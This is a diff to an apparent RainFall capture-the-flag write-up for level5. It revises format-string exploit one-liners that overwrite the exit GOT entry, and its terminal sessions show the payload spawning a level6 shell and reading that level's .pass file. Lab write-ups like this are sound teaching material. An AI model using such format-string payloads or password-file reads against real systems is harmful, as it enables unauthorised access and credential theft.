@@ -92,11 +92,11 @@ For the ```%n``` modifier, we need the number of bytes to write. <br/>
 Here is what our string attack will look like:
 ```
 "exit GOT address" + "134513828 - 4 bytes" + "%4$n"
-python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' 
+python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' 
 ```
 Let's try it out!
 ```
-level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' ; cat -) | ./level5
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | ./level5
 [You will find are in an infinite print loop. Type anything and press "enter"]
 whoami
 level6
@@ -123,7 +123,7 @@ Notes:
 ```
 level6@RainFall:/tmp$ exit
 exit
-level5@RainFall:~$ (python -c 'print "\x14\xa0\x04\x08" + "%134513856d%4$n"' ; cat -) | /home/user/level6/level5_source
+level5@RainFall:~$ (python -c 'print "\x14\xa0\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level6/level5_source
 [... infinite print loop ...]
 cat /home/user/level6/.pass
 ```
